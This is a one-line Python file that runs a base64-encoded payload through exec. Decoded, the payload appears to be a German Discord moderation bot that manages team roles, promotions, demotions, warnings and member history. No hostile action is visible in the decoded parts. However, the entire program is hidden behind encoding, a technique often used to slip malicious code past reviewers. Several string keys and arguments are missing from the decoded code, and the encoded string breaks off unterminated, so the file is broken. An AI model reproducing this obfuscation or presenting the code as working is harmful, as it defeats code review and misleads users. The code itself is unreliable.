import base64; exec(base64.b64decode('dXRmLThpbXBvcnQgZGlzY29yZA0KZnJvbSBkaXNjb3JkIGltcG9ydCBhcHBfY29tbWFuZHMNCmZyb20gZGlzY29yZC5leHQgaW1wb3J0IGNvbW1hbmRzDQppbXBvcnQganNvbg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YSwgdGltZXpvbmUgIA0KaW1wb3J0IG9zDQppbXBvcnQgYXN5bmNpbw0KaW1wb3J0IGlvDQoNCndpdGggb3BlbigiY29uZmlnLmpzb24iLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgY29uZmlnID0ganNvbi5sb2FkKGYpDQoNClRPS0VOID0gY29uZmlnWyJib3RfdG9rZW4iXQ0KR1VJTERfSUQgPSBjb25maWdbImd1aWxkX2lkIl0NClRFQU1fUk9MRV9JRFMgPSBjb25maWdbInRlYW1fcm9sZV9pZCJdDQpBRE1JTl9ST0xFX0lEUyA9IGNvbmZpZ1siYWRtaW5fcm9sZV9pZCJdDQpXQVJOX1JPTEVTID0gY29uZmlnWyJ3YXJuX3JvbGVzIl0gIA0KV0FSTl9GSUxFID0gIndhcm5zLmpzb24iDQpISVNUT1JZX0ZJTEUgPSAibWVtYmVyX2hpc3RvcnkuanNvbiINCg0KaW50ZW50cyA9IGRpc2NvcmQuSW50ZW50cy5hbGwoKQ0KDQpib3QgPSBjb21tYW5kcy5Cb3QoY29tbWFuZF9wcmVmaXg9Ii8iLCBpbnRlbnRzPWludGVudHMpDQoNCg0KbGFzdF9tZXNzYWdlID0gTm9uZSAgDQpsYXN0X2NoYW5uZWwgPSBOb25lICANCg0KZGVmIGlzX2ZlYXR1cmVfZW5hYmxlZChmZWF0dXJlOiBzdHIpIC0+IGJvb2w6DQogICAgcmV0dXJuIGNvbmZpZ1siZmVhdHVyZXMiXS5nZXQoZmVhdHVyZSwgVHJ1ZSkNCg0KZGVmIGNyZWF0ZV9lbWJlZChuYW1lOiBzdHIsICoqa3dhcmdzKSAtPiBkaXNjb3JkLkVtYmVkOg0KICAgICIiIkVyc3RlbGx0IGVpbiBFbWJlZCBiYXNpZXJlbmQgYXVmIGRlciBDb25maWcuIiIiDQogICAgc2V0dGluZ3MgPSBjb25maWdbImVtYmVkcyJdLmdldChuYW1lLCB7fSkNCg0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCgNCiAgICAgICAgdGl0bGU9c2V0dGluZ3MuZ2V0KCJ0aXRsZSIsICJLZWluIFRpdGVsIiksDQogICAgICAgIGRlc2NyaXB0aW9uPXNldHRpbmdzLmdldCgiZGVzY3JpcHRpb24iLCAiIikuZm9ybWF0KCoqa3dhcmdzKSwNCiAgICAgICAgY29sb3I9ZGlzY29yZC5Db2xvcihzZXR0aW5ncy5nZXQoImNvbG9yIiwgMHgzNDk4REIpKSAgDQogICAgKQ0KDQogICAgaWYgImF1dGhvciIgaW4gc2V0dGluZ3M6DQogICAgICAgIGVtYmVkLnNldF9hdXRob3IoDQogICAgICAgICAgICBuYW1lPXNldHRpbmdzWyJhdXRob3IiXS5nZXQoIm5hbWUiLCAiIiksDQogICAgICAgICAgICBpY29uX3VybD1zZXR0aW5nc1siYXV0aG9yIl0uZ2V0KCJpY29uX3VybCIsICIiKQ0KICAgICAgICApDQoNCiAgICBpZiAidGh1bWJuYWlsIiBpbiBzZXR0aW5nczoNCiAgICAgICAgZW1iZWQuc2V0X3RodW1ibmFpbCh1cmw9c2V0dGluZ3NbInRodW1ibmFpbCJdKQ0KDQogICAgaWYgImZvb3RlciIgaW4gc2V0dGluZ3M6DQogICAgICAgIGVtYmVkLnNldF9mb290ZXIoDQogICAgICAgICAgICB0ZXh0PXNldHRpbmdzWyJmb290ZXIiXS5nZXQoInRleHQiLCAiIiksDQogICAgICAgICAgICBpY29uX3VybD1zZXR0aW5nc1siZm9vdGVyIl0uZ2V0KCJpY29uX3VybCIsICIiKQ0KICAgICAgICApDQogICAgaWYgc2V0dGluZ3MuZ2V0KCJ0aW1lc3RhbXAiLCBGYWxzZSk6DQogICAgICAgIGVtYmVkLnRpbWVzdGFtcCA9IGRhdGV0aW1lLm5vdyh0aW1lem9uZS51dGMpIA0KICAgIHJldHVybiBlbWJlZA0KDQpkZWYgbG9hZF93YXJucygpOg0KICAgIGlmIG9zLnBhdGguZXhpc3RzKFdBUk5fRklMRSk6DQogICAgICAgIHdpdGggb3BlbihXQVJOX0ZJTEUsICJyIikgYXMgZjoNCiAgICAgICAgICAgIHJldHVybiBqc29uLmxvYWQoZikNCiAgICByZXR1cm4ge30NCg0KZGVmIHNhdmVfd2FybnMoKToNCiAgICB3aXRoIG9wZW4oV0FSTl9GSUxFLCAidyIpIGFzIGY6DQogICAgICAgIGpzb24uZHVtcCh3YXJucywgZiwgaW5kZW50PTQpDQoNCndhcm5zID0gbG9hZF93YXJucygpDQoNCmRlZiBsb2FkX2hpc3RvcnkoKToNCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhISVNUT1JZX0ZJTEUpOg0KICAgICAgICB3aXRoIG9wZW4oSElTVE9SWV9GSUxFLCAiciIpIGFzIGY6DQogICAgICAgICAgICByZXR1cm4ganNvbi5sb2FkKGYpDQogICAgcmV0dXJuIHt9DQoNCmRlZiBzYXZlX2hpc3RvcnkoaGlzdG9yeSk6DQogICAgd2l0aCBvcGVuKEhJU1RPUllfRklMRSwgInciKSBhcyBmOg0KICAgICAgICBqc29uLmR1bXAoaGlzdG9yeSwgZiwgaW5kZW50PTQpDQoNCmRlZiB1cGRhdGVfaGlzdG9yeShtZW1iZXI6IGRpc2NvcmQuTWVtYmVyLCBhY3Rpb246IHN0ciwgZGV0YWlsczogc3RyKToNCiAgICAiIiJBa3R1YWxpc2llcnQgZGllIEhpc3RvcmllIGVpbmVzIE1pdGdsaWVkcyIiIg0KICAgIHVzZXJfaWQgPSBzdHIobWVtYmVyLmlkKQ0KICAgIA0KICAgIGlmIHVzZXJfaWQgbm90IGluIGhpc3Rvcnk6DQogICAgICAgIGhpc3RvcnlbdXNlcl9pZF0gPSB7DQogICAgICAgICAgICAgICAgICAgICAgIDogZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIiksDQogICAgICAgICAgICAgICAgICAgICAgICAgOiAiTi9BIiwNCiAgICAgICAgICAgICAgICAgICA6IFtdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogIk4vQSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgIDogW10NCiAgICAgICAgfQ0KICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgaWYgYWN0aW9uID09ICJVcHJhbmsiOg0KICAgICAgICBoaXN0b3J5W3VzZXJfaWRdWyJsYXN0X3VwcmFuayJdID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIikNCiAgICBlbGlmIGFjdGlvbiA9PSAiV2FybiIgYW5kICJleHBpcmVkIiBpbiBkZXRhaWxzLmxvd2VyKCk6DQogICAgICAgIGhpc3RvcnlbdXNlcl9pZF1bImxhc3Rfd2Fybl9leHBpcmVkIl0gPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJWQuJW0uJVkgJUg6JU06JVMiKQ0KICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgaGlzdG9yeVt1c2VyX2lkXVsiZnVsbF9oaXN0b3J5Il0uYXBwZW5kKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICkNCiAgICANCiAgICBzYXZlX2hpc3RvcnkoaGlzdG9yeSkNCg0KaGlzdG9yeSA9IGxvYWRfaGlzdG9yeSgpDQoNCkBib3QuZXZlbnQNCmFzeW5jIGRlZiBvbl9yZWFkeSgpOg0KICAgIGd1aWxkID0gZGlzY29yZC5PYmplY3QoaWQ9R1VJTERfSUQpDQogICAgYm90LnRyZWUuY29weV9nbG9iYWxfdG8oZ3VpbGQ9Z3VpbGQpDQogICAgYXdhaXQgYm90LnRyZWUuc3luYyhndWlsZD1ndWlsZCkgDQoNCiAgICBwcmludChmIkJvdCBpc3Qgb25saW5lOiB7Ym90LnVzZXJ9ISIpDQogICAgcHJpbnQoIlNsYXNoLUNvbW1hbmRzIHdlcmRlbiBzeW5jaHJvbmlzaWVydC4uLiIpDQoNCg0KQGJvdC5jb21tYW5kKCkNCmFzeW5jIGRlZiBzeW5jKGN0eCk6DQogICAgYXdhaXQgYm90LnRyZWUuc3luYygpDQogICAgYXdhaXQgY3R4LnNlbmQoIlNsYXNoLUNvbW1hbmRzIHd1cmRlbiBzeW5jaHJvbmlzaWVydCEiKQ0KDQphc3luYyBkZWYgc2VuZF9kbShtZW1iZXI6IGRpc2NvcmQuTWVtYmVyLCB0aXRsZTogc3RyLCBkZXNjcmlwdGlvbjogc3RyLCBpbnRlcmFjdGlvbjogZGlzY29yZC5JbnRlcmFjdGlvbik6DQogICAgdHJ5Og0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9dGl0bGUsIGRlc2NyaXB0aW9uPWRlc2NyaXB0aW9uLCBjb2xvcj1kaXNjb3JkLkNvbG9yLmJsdWUoKSkNCiAgICAgICAgaWYgaW50ZXJhY3Rpb24uY2hhbm5lbDoNCiAgICAgICAgICAgIGxhc3RfbWVzc2FnZSA9IGF3YWl0IGludGVyYWN0aW9uLmNoYW5uZWwuc2VuZCgiLiIpDQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iTWVociBJbmZvcyIsIHZhbHVlPWYiW05hY2hyaWNodCBhbnplaWdlbl0oaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy97aW50ZXJhY3Rpb24uZ3VpbGQuaWR9L3tpbnRlcmFjdGlvbi5jaGFubmVsLmlkfS97bGFzdF9tZXNzYWdlLmlkfSkiKQ0KICAgICAgICAgICAgYXdhaXQgbGFzdF9tZXNzYWdlLmRlbGV0ZSgpIA0KICAgICAgICBhd2FpdCBtZW1iZXIuc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgZGlzY29yZC5Gb3JiaWRkZW46DQogICAgICAgIHByaW50KGYiW1dBUk5VTkddIEtvbm50ZSB7bWVtYmVyfSBrZWluZSBETSBzZW5kZW4gKERNcyBtw7ZnbGljaGVyd2Vpc2UgZGVha3RpdmllcnQpLiIpDQoNCkBib3QudHJlZS5jb21tYW5kKG5hbWU9InRlYW1saXN0ZSIsIGRlc2NyaXB0aW9uPSJaZWlndCBkaWUgVGVhbW1pdGdsaWVkZXIgdW5kIGlocmUgUm9sbGVuLiIpDQphc3luYyBkZWYgdGVhbWxpc3RlKGludGVyYWN0aW9uOiBkaXNjb3JkLkludGVyYWN0aW9uKToNCiAgICBpZiBub3QgaXNfZmVhdHVyZV9lbmFibGVkKCJ0ZWFtbGlzdGUiKToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIERpZXNlIEZ1bmt0aW9uIGlzdCBkZWFrdGl2aWVydC4iLCBlcGhlbWVyYWw9VHJ1ZSkNCg0KICAgIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4pyFIERpZSBUZWFtbGlzdGUgd2lyZCBha3R1YWxpc2llcnQhIiwgZXBoZW1lcmFsPVRydWUpDQogICAgYXdhaXQgdXBkYXRlX3RlYW1saXN0ZShpbnRlcmFjdGlvbi5jaGFubmVsKQ0KDQoNCmFzeW5jIGRlZiB1cGRhdGVfdGVhbWxpc3RlKGNoYW5uZWwpOg0KICAgIGdsb2JhbCBsYXN0X21lc3NhZ2UsIGxhc3RfY2hhbm5lbCAgDQoNCiAgICBndWlsZCA9IGNoYW5uZWwuZ3VpbGQNCiAgICB0ZWFtX3JvbGVzID0ge3JvbGUuaWQ6IHJvbGUgZm9yIHJvbGUgaW4gZ3VpbGQucm9sZXMgaWYgcm9sZS5pZCBpbiBURUFNX1JPTEVfSURTfQ0KDQogICAgdGVhbV9tZW1iZXJzID0ge3JvbGU6IFtdIGZvciByb2xlIGluIHRlYW1fcm9sZXMudmFsdWVzKCl9DQogICAgZm9yIG1lbWJlciBpbiBndWlsZC5tZW1iZXJzOg0KICAgICAgICBmb3Igcm9sZSBpbiBtZW1iZXIucm9sZXM6DQogICAgICAgICAgICBpZiByb2xlLmlkIGluIHRlYW1fcm9sZXM6DQogICAgICAgICAgICAgICAgdGVhbV9tZW1iZXJzW3RlYW1fcm9sZXNbcm9sZS5pZF1dLmFwcGVuZChtZW1iZXIubWVudGlvbikNCg0KICAgIGRlc2NyaXB0aW9uID0gIiINCiAgICBmb3Igcm9sZSwgbWVtYmVycyBpbiB0ZWFtX21lbWJlcnMuaXRlbXMoKToNCiAgICAgICAgcm9sZV9tZW50aW9uID0gcm9sZS5tZW50aW9uICANCiAgICAgICAgbWVtYmVyc19saXN0ID0gIlxuIi5qb2luKG1lbWJlcnMpIGlmIG1lbWJlcnMgZWxzZSAiS2VpbmUgTWl0Z2xpZWRlciINCiAgICAgICAgZGVzY3JpcHRpb24gKz0gZiIqKntyb2xlX21lbnRpb259KiogKHtsZW4obWVtYmVycyl9IE1pdGdsaWVkZXIpXG57bWVtYmVyc19saXN0fVxuXG4iDQoNCiAgICBlbWJlZCA9IGNyZWF0ZV9lbWJlZCgidGVhbWxpc3RlIikNCiAgICBlbWJlZC5kZXNjcmlwdGlvbiA9IGRlc2NyaXB0aW9uIA0KDQogICAgdGVhbWxpc3RlX3NldHRpbmdzID0gY29uZmlnWyJlbWJlZHMiXS5nZXQoInRlYW1saXN0ZSIsIHt9KQ0KICAgIGltYWdlX3VybCA9IHRlYW1saXN0ZV9zZXR0aW5ncy5nZXQoImltYWdlIikNCiAgICBpZiBpbWFnZV91cmw6DQogICAgICAgIGVtYmVkLnNldF9pbWFnZSh1cmw9aW1hZ2VfdXJsKQ0KDQogICAgaWYgbGFzdF9tZXNzYWdlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBhd2FpdCBsYXN0X21lc3NhZ2UuZGVsZXRlKCkNCiAgICAgICAgZXhjZXB0IGRpc2NvcmQuTm90Rm91bmQ6DQogICAgICAgICAgICBwcmludCgiW0RFQlVHXSBBbHRlIE5hY2hyaWNodCBuaWNodCBnZWZ1bmRlbiAodmllbGxlaWNodCBiZXJlaXRzIGdlbMO2c2NodCkuIikNCiAgICAgICAgZXhjZXB0IGRpc2NvcmQuRm9yYmlkZGVuOg0KICAgICAgICAgICAgcHJpbnQoIltERUJVR10gQm90IGhhdCBrZWluZSBCZXJlY2h0aWd1bmcsIGRpZSBOYWNocmljaHQgenUgbMO2c2NoZW4uIikNCg0KICAgIGxhc3RfbWVzc2FnZSA9IGF3YWl0IGNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCiAgICBsYXN0X2NoYW5uZWwgPSBjaGFubmVsDQoNCg0KQGJvdC5ldmVudA0KYXN5bmMgZGVmIG9uX21lbWJlcl91cGRhdGUoYmVmb3JlOiBkaXNjb3JkLk1lbWJlciwgYWZ0ZXI6IGRpc2NvcmQuTWVtYmVyKToNCiAgICAiIiJXaXJkIGF1c2dlbMO2c3QsIHdlbm4gc2ljaCBkaWUgUm9sbGVuIGVpbmVzIFVzZXJzIMOkbmRlcm4uIiIiDQogICAgYWRkZWRfcm9sZXMgPSBbcm9sZSBmb3Igcm9sZSBpbiBhZnRlci5yb2xlcyBpZiByb2xlIG5vdCBpbiBiZWZvcmUucm9sZXNdDQogICAgcmVtb3ZlZF9yb2xlcyA9IFtyb2xlIGZvciByb2xlIGluIGJlZm9yZS5yb2xlcyBpZiByb2xlIG5vdCBpbiBhZnRlci5yb2xlc10NCg0KICAgIHJlbGV2YW50X3JvbGVzID0gW3JvbGUgZm9yIHJvbGUgaW4gYWRkZWRfcm9sZXMgKyByZW1vdmVkX3JvbGVzIGlmIHJvbGUuaWQgaW4gVEVBTV9ST0xFX0lEU10NCg0KICAgIGlmIHJlbGV2YW50X3JvbGVzIGFuZCBsYXN0X2NoYW5uZWw6DQogICAgICAgIGF3YWl0IHVwZGF0ZV90ZWFtbGlzdGUobGFzdF9jaGFubmVsKSANCg0KDQpAYm90LnRyZWUuY29tbWFuZChuYW1lPSJ0ZWFtYmVpdHJpdHQiLCBkZXNjcmlwdGlvbj0iRsO8Z3QgZWluZW4gVXNlciBpbiBkYXMgVGVhbSBlaW4uIikNCkBhcHBfY29tbWFuZHMuZGVzY3JpYmUobWVtYmVyPSJEYXMgTWl0Z2xpZWQsIGRhcyBiZWl0cmV0ZW4gc29sbC4iLCByb2xlPSJEaWUgc3BlemllbGxlIFRlYW1yb2xsZSwgZGllIHp1Z2V3aWVzZW4gd2lyZC4iKQ0KYXN5bmMgZGVmIHRlYW1iZWl0cml0dChpbnRlcmFjdGlvbjogZGlzY29yZC5JbnRlcmFjdGlvbiwgbWVtYmVyOiBkaXNjb3JkLk1lbWJlciwgcm9sZTogZGlzY29yZC5Sb2xlKToNCiAgICBpZiBub3QgaXNfZmVhdHVyZV9lbmFibGVkKCJ0ZWFtYmVpdHJpdHQiKToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIERpZXNlIEZ1bmt0aW9uIGlzdCBkZWFrdGl2aWVydC4iLCBlcGhlbWVyYWw9VHJ1ZSkNCiAgICBpZiBub3QgYW55KHJvbGUuaWQgaW4gQURNSU5fUk9MRV9JRFMgZm9yIHJvbGUgaW4gaW50ZXJhY3Rpb24udXNlci5yb2xlcyk6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEdSBoYXN0IGtlaW5lIEJlcmVjaHRpZ3VuZyBmw7xyIGRpZXNlbiBCZWZlaGwuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiByb2xlLmlkIG5vdCBpbiBURUFNX1JPTEVfSURTOg0KICAgICAgICByZXR1cm4gYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinYwgRGllc2UgUm9sbGUgaXN0IGtlaW5lIGfDvGx0aWdlIFRlYW1yb2xsZS4iLCBlcGhlbWVyYWw9VHJ1ZSkNCg0KICAgIHN0YW5kYXJkX3RlYW1fcm9sZSA9IGRpc2NvcmQudXRpbHMuZ2V0KGludGVyYWN0aW9uLmd1aWxkLnJvbGVzLCBpZD1URUFNX1JPTEVfSURTWzBdKQ0KICAgIGlmIG5vdCBzdGFuZGFyZF90ZWFtX3JvbGU6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBTdGFuZGFyZC1UZWFtcm9sbGUgd3VyZGUgbmljaHQgZ2VmdW5kZW4uIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBhd2FpdCBtZW1iZXIuYWRkX3JvbGVzKHN0YW5kYXJkX3RlYW1fcm9sZSwgcm9sZSkNCg0KICAgIGVtYmVkID0gY3JlYXRlX2VtYmVkKA0KICAgICAgICAgICAgICAgICAgICAgICwNCiAgICAgICAgbWVtYmVyPW1lbWJlci5tZW50aW9uLA0KICAgICAgICByb2xlPXJvbGUubWVudGlvbiwNCiAgICAgICAgYWRtaW49aW50ZXJhY3Rpb24udXNlci5tZW50aW9uLA0KICAgICAgICBhZG1pbl9yb2xlcz0iLCAiLmpvaW4oZiI8QCZ7cm9sZV9pZH0+IiBmb3Igcm9sZV9pZCBpbiBBRE1JTl9ST0xFX0lEUykgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICApDQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinIUgRGVyIEJlaXRyaXR0IHd1cmRlIGVyZm9sZ3JlaWNoIHZlcmFyYmVpdGV0ISIsIGVwaGVtZXJhbD1UcnVlKQ0KICAgIGF3YWl0IGludGVyYWN0aW9uLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCiAgICBhd2FpdCBzZW5kX2RtKG1lbWJlciwgIlRlYW1iZWl0cml0dCIsIGYiV2lsbGtvbW1lbiBpbSBUZWFtIGFscyB7cm9sZS5uYW1lfS4gV2lyIGZyZXVlbiB1bnMgYXVmIGRpY2guIiwgaW50ZXJhY3Rpb24pDQogICAgdXBkYXRlX2hpc3RvcnkoDQogICAgICAgIG1lbWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgKQ0KDQpAYm90LnRyZWUuY29tbWFuZChuYW1lPSJ1cHJhbmsiLCBkZXNjcmlwdGlvbj0iQmVmw7ZyZGVydCBlaW4gVGVhbW1pdGdsaWVkLiIpDQpAYXBwX2NvbW1hbmRzLmRlc2NyaWJlKG1lbWJlcj0iRGFzIE1pdGdsaWVkLCBkYXMgYmVmw7ZyZGVydCB3aXJkLiIsIG9sZF9yb2xlPSJBbHRlIFJvbGxlIiwgbmV3X3JvbGU9Ik5ldWUgUm9sbGUiKQ0KYXN5bmMgZGVmIHVwcmFuayhpbnRlcmFjdGlvbjogZGlzY29yZC5JbnRlcmFjdGlvbiwgbWVtYmVyOiBkaXNjb3JkLk1lbWJlciwgb2xkX3JvbGU6IGRpc2NvcmQuUm9sZSwgbmV3X3JvbGU6IGRpc2NvcmQuUm9sZSk6DQogICAgaWYgbm90IGlzX2ZlYXR1cmVfZW5hYmxlZCgidXByYW5rIik6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEaWVzZSBGdW5rdGlvbiBpc3QgZGVha3RpdmllcnQuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiBub3QgYW55KHJvbGUuaWQgaW4gQURNSU5fUk9MRV9JRFMgZm9yIHJvbGUgaW4gaW50ZXJhY3Rpb24udXNlci5yb2xlcyk6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEdSBoYXN0IGtlaW5lIEJlcmVjaHRpZ3VuZyBmw7xyIGRpZXNlbiBCZWZlaGwuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiBvbGRfcm9sZS5pZCBub3QgaW4gVEVBTV9ST0xFX0lEUyBvciBuZXdfcm9sZS5pZCBub3QgaW4gVEVBTV9ST0xFX0lEUzoNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIEVpbmUgZGVyIFJvbGxlbiBpc3Qga2VpbmUgZ8O8bHRpZ2UgVGVhbXJvbGxlLiIsIGVwaGVtZXJhbD1UcnVlKQ0KDQogICAgYXdhaXQgbWVtYmVyLnJlbW92ZV9yb2xlcyhvbGRfcm9sZSkNCiAgICBhd2FpdCBtZW1iZXIuYWRkX3JvbGVzKG5ld19yb2xlKQ0KDQogICAgZW1iZWQgPSBjcmVhdGVfZW1iZWQoDQogICAgICAgICAgICAgICAgLA0KICAgICAgICBtZW1iZXI9bWVtYmVyLm1lbnRpb24sDQogICAgICAgIG9sZF9yb2xlPW9sZF9yb2xlLm1lbnRpb24sDQogICAgICAgIG5ld19yb2xlPW5ld19yb2xlLm1lbnRpb24sDQogICAgICAgIGFkbWluPWludGVyYWN0aW9uLnVzZXIubWVudGlvbiwNCiAgICAgICAgYWRtaW5fcm9sZXM9IiwgIi5qb2luKGYiPEAme3JvbGVfaWR9PiIgZm9yIHJvbGVfaWQgaW4gQURNSU5fUk9MRV9JRFMpICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgKQ0KDQogICAgYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinIUgRGVyIFVwcmFuayB3dXJkZSBlcmZvbGdyZWljaCBkdXJjaGdlZsO8aHJ0ISIsIGVwaGVtZXJhbD1UcnVlKQ0KICAgIGF3YWl0IGludGVyYWN0aW9uLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCiAgICBhd2FpdCBzZW5kX2RtKG1lbWJlciwgIlVwcmFuayIsIGYiRHUgaGFzdCBlaW4gKipVcHJhbmsqKiB2b24ge29sZF9yb2xlLm5hbWV9IHp1IHtuZXdfcm9sZS5uYW1lfSBlcmhhbHRlbi4iLCBpbnRlcmFjdGlvbikNCg0KICAgIGhpc3Rvcnlbc3RyKG1lbWJlci5pZCldWyJsYXN0X3VwcmFuayJdID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVkLiVtLiVZICVIOiVNOiVTIikNCiAgICB1cGRhdGVfaGlzdG9yeSgNCiAgICAgICAgbWVtYmVyLA0KICAgICAgICAgICAgICAgICwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICApDQoNCkBib3QudHJlZS5jb21tYW5kKG5hbWU9ImRlcmFuayIsIGRlc2NyaXB0aW9uPSJTZXR6dCBkaWUgVGVhbXJvbGxlIGVpbmVzIE1pdGdsaWVkcyBoZXJhYi4iKQ0KQGFwcF9jb21tYW5kcy5kZXNjcmliZSgNCiAgICBtZW1iZXI9IkRhcyBNaXRnbGllZCwgZGFzIGRlZ3JhZGllcnQgd2lyZC4iLA0KICAgIG9sZF9yb2xlPSJEaWUgdm9yaGVyaWdlIFJvbGxlLiIsDQogICAgbmV3X3JvbGU9IkRpZSBuZXVlIFJvbGxlLiIsDQogICAgcmVhc29uPSJEZXIgR3J1bmQgZsO8ciBkZW4gRGVyYW5rLiINCikNCmFzeW5jIGRlZiBkZXJhbmsoaW50ZXJhY3Rpb246IGRpc2NvcmQuSW50ZXJhY3Rpb24sIG1lbWJlcjogZGlzY29yZC5NZW1iZXIsIG9sZF9yb2xlOiBkaXNjb3JkLlJvbGUsIG5ld19yb2xlOiBkaXNjb3JkLlJvbGUsIHJlYXNvbjogc3RyKToNCiAgICBpZiBub3QgaXNfZmVhdHVyZV9lbmFibGVkKCJkZXJhbmsiKToNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIERpZXNlIEZ1bmt0aW9uIGlzdCBkZWFrdGl2aWVydC4iLCBlcGhlbWVyYWw9VHJ1ZSkNCiAgICANCiAgICBpZiBub3QgYW55KHJvbGUuaWQgaW4gQURNSU5fUk9MRV9JRFMgZm9yIHJvbGUgaW4gaW50ZXJhY3Rpb24udXNlci5yb2xlcyk6DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBEdSBoYXN0IGtlaW5lIEJlcmVjaHRpZ3VuZyBmw7xyIGRpZXNlbiBCZWZlaGwuIiwgZXBoZW1lcmFsPVRydWUpDQoNCiAgICBpZiBvbGRfcm9sZS5pZCBub3QgaW4gVEVBTV9ST0xFX0lEUyBvciBuZXdfcm9sZS5pZCBub3QgaW4gVEVBTV9ST0xFX0lEUzoNCiAgICAgICAgcmV0dXJuIGF3YWl0IGludGVyYWN0aW9uLnJlc3BvbnNlLnNlbmRfbWVzc2FnZSgi4p2MIEVpbmUgb2RlciBiZWlkZSBSb2xsZW4gc2luZCBrZWluZSBnw7xsdGlnZW4gVGVhbXJvbGxlbi4iLCBlcGhlbWVyYWw9VHJ1ZSkNCg0KICAgIHRyeToNCiAgICAgICAgYXdhaXQgbWVtYmVyLnJlbW92ZV9yb2xlcyhvbGRfcm9sZSkNCiAgICAgICAgYXdhaXQgbWVtYmVyLmFkZF9yb2xlcyhuZXdfcm9sZSkNCiAgICBleGNlcHQgZGlzY29yZC5Gb3JiaWRkZW46DQogICAgICAgIHJldHVybiBhd2FpdCBpbnRlcmFjdGlvbi5yZXNwb25zZS5zZW5kX21lc3NhZ2UoIuKdjCBCb3QgaGF0IGtlaW5lIEJlcmVjaHRpZ3VuZywgUm9sbGVuIHp1IHZlcndhbHRlbi4iLCBlcGhlbWVyYWw9VHJ1ZSkNCiAgICBleGNlcHQgZGlzY29yZC5IVFRQRXhjZXB0aW9uOg0KICAgICAgICByZXR1cm4gYXdhaXQgaW50ZXJhY3Rpb24ucmVzcG9uc2Uuc2VuZF9tZXNzYWdlKCLinYwgRmVobGVyIGJlaW0gQWt0dWFsaXNpZXJlbiBkZXIgUm9sbGVuLiIsIGVwaGVtZXJhbD1UcnVlKQ0KDQogICAgZW1iZWQgPSBjcmVhdGVfZW1iZWQoDQogICAgICAgICAgICAgICAgLA0KICAgICAgICBtZW1iZXI9bWVtYmVyLm1lbnRpb24sDQogICAgICAgIG9sZF9yb2xlPW9sZF9yb2xlLm1lbnRpb24sDQogICAgICAgIG5ld19yb2xlPW5ld19yb2xlLm1lbnRpb24sDQogICAgICAgIHJlYXNvbj1yZWFzb24sDQogICAgICAgIGFkbWluPWludGVyYWN0aW9uLnV